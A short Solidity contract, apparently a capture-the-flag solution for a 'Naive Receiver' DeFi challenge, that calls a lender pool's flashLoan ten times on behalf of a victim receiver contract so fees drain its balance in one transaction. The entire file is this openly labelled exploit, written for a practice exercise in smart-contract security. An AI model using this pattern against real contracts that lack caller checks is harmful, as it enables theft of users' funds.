// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;
/**
 * @title NaiveRecieverAttack
 * @author wzrdk3llly
 * @notice  Attack contract for performing the receiver attack in 1 transaction. These are nested calls, but onchain this would all occur in one transaction
 * 
 */
contract NaiveRecieverAttack{

    address public naiveReceiverLenderPool;
    address public flashLoanReceiver;

    address public owner;
    constructor(address _naiveReceiverLenderPool, address _flashLoanReceiver) {
         naiveReceiverLenderPool = _naiveReceiverLenderPool;
         flashLoanReceiver =  _flashLoanReceiver;
         owner = msg.sender;

    }

    function attack() external {
    for (uint i = 0; i < 10; i++){
            INaiveReceiverLenderPool(naiveReceiverLenderPool).flashLoan(flashLoanReceiver, 1_000e18);
        }

    }
}

interface INaiveReceiverLenderPool {
    function flashLoan(address borrower, uint256 amount) external;
}